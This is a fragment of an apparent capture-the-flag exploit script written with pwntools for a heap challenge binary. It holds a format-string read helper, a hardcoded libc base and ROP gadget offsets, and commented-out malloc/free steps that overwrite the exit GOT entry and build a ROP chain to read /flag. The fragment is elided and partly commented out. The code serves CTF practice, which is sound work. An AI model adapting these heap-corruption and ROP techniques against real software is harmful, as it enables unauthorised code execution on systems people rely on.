...
def arbitrary_read(p, content):
    p.sendline(b"7")
    p.recvuntil(b"(decimal format):")
    p.sendline(b"%b" % (content)) 
    print(p.recvline()) 
    p.recvuntil(END_OF_MENU)

libc_base = 0x7f9a48960000
pop_rdi = 0x023b6a
pop_rsi = 0x02601f
...
def launch_attack(p):
    ...
    # malloc(p, 8, b'a')
    # free(p, 1)
    # content = b'a'*(0x20 - 8) + b'\x21' + b'\x00'*7 + p64(exe.got['exit']) 
    # free(p, 0)     
    # malloc(p, 8, content)
    # c1 = p64(base+pop_rdi) + b"/flag\0\0\0" + p64(base+pop_rsi) + b'\x21' + b'\x00'*7 + p64(777) 
    # malloc(p, 8, c1)
    # c2 = p64(base + mov_eax)
    # malloc(p,8, c2)
    p.interactive()
